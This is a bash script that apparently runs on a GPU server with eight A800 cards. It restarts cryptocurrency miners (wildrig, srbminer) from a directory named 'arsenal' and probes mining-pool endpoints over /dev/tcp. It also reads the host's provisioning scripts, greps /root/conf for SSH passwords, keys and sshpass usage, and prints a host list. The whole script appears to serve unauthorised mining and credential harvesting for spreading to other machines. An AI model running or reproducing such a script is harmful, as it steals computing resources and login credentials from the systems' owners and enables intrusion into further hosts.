#!/bin/bash
# exec6a: restore g0023 8x A800 miners (canonical) + read vendor provisioning toolkit
echo "=== ID"; hostname; date -u
echo "=== PS1"; ps -eo pid,args | grep -E 'wildrig|srbminer' | grep -v grep | head -5
echo "=== HELP"; /opt/arsenal/miners/wildrig/wildrig-multi --help 2>&1 | head -40
echo "=== POOLTEST"
for ep in prl-sg.kryptex.network:7048 prl-sg.kryptex.network:8048 prl-eu.kryptex.network:7048 prl-us.kryptex.network:7048 prl-hk.kryptex.network:7048 pearlhash.xyz:9000 pool.pearlhash.xyz:9000 pearl.luckypool.io:443; do
  h=${ep%%:*}; p=${ep##*:}; timeout 4 bash -c "echo > /dev/tcp/$h/$p" 2>/dev/null && echo "OPEN $ep" || echo "CLOSED $ep"
done
echo "=== TOOLKIT"
ls -la /root/conf | awk '{print $5,$9}' | grep -iE 'install|ssh|host|key|rsa|pass' | head -15
for f in /root/conf/batch_install.sh /root/conf/change_hostname.sh /root/conf/check.sh /root/conf/addiptoyaml.txt; do echo "--- $f"; head -c 2500 "$f" 2>/dev/null; echo; done
echo "=== CREDGREP"
timeout 30 grep -rnaE 'sshpass|SSH_PASS|PASSWORD=|passwd=|ssh -i|scp -i' /root/conf 2>/dev/null | cut -c1-200 | head -20
echo "=== HOSTLIST"; head -12 /root/conf/hostlist 2>/dev/null; wc -l /root/conf/hostlist 2>/dev/null
echo "=== DONE"
